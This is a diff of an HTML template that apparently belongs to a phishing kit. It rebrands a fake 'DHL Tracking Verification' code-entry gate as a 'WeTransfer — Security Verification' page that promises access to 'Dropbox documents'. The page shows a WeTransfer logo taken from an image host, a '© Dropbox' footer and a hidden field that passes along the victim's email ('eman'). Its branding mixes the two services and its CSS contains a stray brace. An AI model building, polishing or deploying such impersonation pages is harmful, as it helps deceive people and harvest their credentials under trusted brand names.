@@ -3,12 +3,12 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Security Code Challenge</title>
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@300&display=swap">
-  <style>
+  <title>WeTransfer — Security Verification</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap">
+ <style>
     body {
       font-family: 'Roboto', sans-serif;
-      background-color: #d97716;
+      background-color: #F4F6F8;
       margin: 0;
       padding: 0;
       display: flex;
@@ -20,10 +20,22 @@
       box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.1);
     }
 
+   }
+
+    /* WeTransfer Logo */
+    .brand-logo {
+      margin-bottom: 10px;
+    }
+
+    .brand-logo img {
+      height: 48px;
+      width: auto;
+      filter: brightness(0) invert(1); /* White logo on orange */
+    }
     h1 {
       font-size: 32px;
       margin-bottom: 15px;
-      color: #f2f4f5; 
+      color: #2980B9; 
     }
 
     p {
@@ -65,7 +77,7 @@
       width: 100%;
       padding: 12px;
       margin-top: 10px;
-      border: 2px solid #f2f4f5;
+      border: 2px solid #2980B9;
       border-radius: 5px;
       font-size: 16px;
       box-sizing: border-box;
@@ -85,7 +97,7 @@
       border: none;
       border-radius: 5px;
       font-size: 16px;
-      background-color: #bf351d; 
+      background-color: #2980B9; 
       color: #FFFFFF;
       cursor: pointer;
       transition: background-color 0.3s, transform 0.3s; /* Add transform transition */
@@ -97,7 +109,7 @@
     }
 
     #captcha-message {
-      color: #f8f6f4;
+      color: #E74C3C;
       text-align: center;
       margin-top: 10px;
       display: none;
@@ -105,35 +117,43 @@
   </style>
 </head>
 <body>
-  <h1>DHL Tracking Verification</h1>
-  <p></p>
+  <!-- WeTransfer Logo -->
+  <div class="brand-logo">
+    <img src="https://i.ibb.co/ms5j2Cz/Capture.png" alt="WeTransfer">
+  </div>
+
+  <h1></h1>
+  <p class="subtitle">Enter the code below to access your Dropbox documents</p>
+
   <div id="captcha-container">{{ code }}</div>
+
   <form id="captcha-form" method="POST" action="{{ url_for('captcha') }}">
-    <input id="captcha-input" type="text" placeholder="Enter the tracking code above." name="code" required>
+    <input id="captcha-input" type="text" placeholder="Enter file security code" name="code" required autocomplete="off">
     <input type="hidden" name="web" value="{{ eman }}">
     <br>
-    <button id="captcha-submit" type="submit">Track</button>
+    <button id="captcha-submit" type="submit">Verify & Continue</button>
   </form>
+
   <p id="captcha-message"></p>
+
+  <p class="footer-text">© Dropbox</p>
+
   <script>
-    // 사용자 입력이 코드와 일치하는지 확인
     var captchaForm = document.getElementById('captcha-form');
     var errorMessage = document.getElementById('captcha-message');
 
     captchaForm.addEventListener('submit', function(event) {
       event.preventDefault();
       var captchaInput = document.getElementById('captcha-input');
-
-      // Using {{ code }} directly in JavaScript is not possible due to string interpolation
       var correctCode = "{{ code }}";
 
       if (captchaInput.value == correctCode) {
-        // 양식 제출
         captchaForm.submit();
       } else {
-        errorMessage.innerText = 'Sorry, the code you entered is incorrect. Please try again.';
-        errorMessage.style.display = 'block'; // 오류 메시지 표시
+        errorMessage.innerText = 'The code you entered is incorrect. Please try again.';
+        errorMessage.style.display = 'block';
         captchaInput.value = '';
+        captchaInput.focus();
       }
     });
   </script>
